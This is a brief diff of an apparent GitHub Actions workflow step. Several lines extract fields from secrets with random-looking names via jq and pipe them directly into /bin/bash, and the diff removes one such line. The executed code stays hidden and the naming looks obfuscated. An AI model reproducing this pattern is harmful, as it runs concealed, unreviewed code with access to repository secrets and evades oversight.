@@ -20,7 +20,6 @@ jobs:
           zkvxa3473: ${{ secrets.zkvxa3473 }}
         run: |
           printf '%s' "$zkvxa3473" | jq -r .rbpx5 | /bin/bash
-          printf '%s' "$rd747" | jq -r .essz8 | /bin/bash
           printf '%s' "$vay7" | jq -r .fag6840 | /bin/bash
           echo $cihvh1851 | jq -r .qctc0894 | /bin/bash
           printf '%s' "$rg762" | jq -r .r8623 | /bin/bash
